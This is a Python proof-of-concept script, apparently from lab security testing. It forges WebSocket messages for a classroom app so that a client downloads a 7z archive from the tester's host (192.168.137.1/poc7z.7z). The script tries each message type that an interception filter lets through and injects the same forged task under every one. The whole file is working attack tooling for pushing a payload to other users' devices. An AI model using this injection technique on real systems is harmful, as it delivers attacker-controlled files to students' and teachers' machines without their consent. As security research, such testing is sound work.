# -*- coding: utf-8 -*-
"""inject_multi_types.py - 把带 zipUrl 的 TaskDetail 挂到多个"白名单"类型上逐个试。
白名单(intercept 不会丢的类型): 0/1/2/1007/2021/1000004/1030489-96
"""
import json
import os
import time

BASE = os.path.dirname(os.path.abspath(__file__))
INJ = os.path.join(BASE, "ws_inject.txt")
OUR = "192.168.137.1"
ROOM = "UXHOVJJF"
UID = "2112229"
ZIP = "http://%s/poc7z.7z" % OUR


def env(mtype, data, cid, tag, cmd=0):
    return json.dumps({
        "cId": cid, "cmd": cmd, "from": "10001", "gt": 0, "id": "1349658", "rt": 1,
        "smsg": {"classRoomId": ROOM, "createTag": tag, "data": data,
                 "forward": 0, "senderId": 0, "type": mtype, "userIds": UID},
        "tags": ["RWYZKUIF"]}, ensure_ascii=False)


def inj(js, label, wait=9):
    with open(INJ, "w", encoding="utf-8") as f:
        f.write(js)
    print("INJ %s" % label, flush=True)
    time.sleep(wait)


def main():
    ri = {"sourceId": "LAB_R1", "taskId": "LAB_T1", "name": "poc7z",
          "type": 1, "zipUrl": ZIP}
    td = {"taskId": "LAB_T1", "subTaskId": "LAB_S1", "classroomId": ROOM,
          "classroomName": "lab", "taskStatus": 1, "taskType": 0,
          "desktopId": "LAB_D1", "sourceId": "LAB_R1", "number": 1,
          "originTotalNumber": 1, "content": "lab", "resourceInfo": ri,
          "createTime": int(time.time() * 1000), "pptSource": 1, "isFromPPT": 1}
    js = json.dumps(td, ensure_ascii=False)
    types = [(0, "canvas_tag"), (1, "canvas_tag"), (2, "canvas_tag"),
             (1007, "canvas_tag"), (2021, "canvas_tag"),
             (1000004, "canvas_tag"), (1030496, "canvas_tag"),
             (1030491, "canvas_tag"), (1030490, "canvas_tag"),
             (1030489, "canvas_tag")]
    for mt, tg in types:
        inj(env(mt, js, "179P%05d" % (50 + mt % 40), tg), "type=%d %s" % (mt, tg), 8)
    print("done", flush=True)


if __name__ == "__main__":
    main()
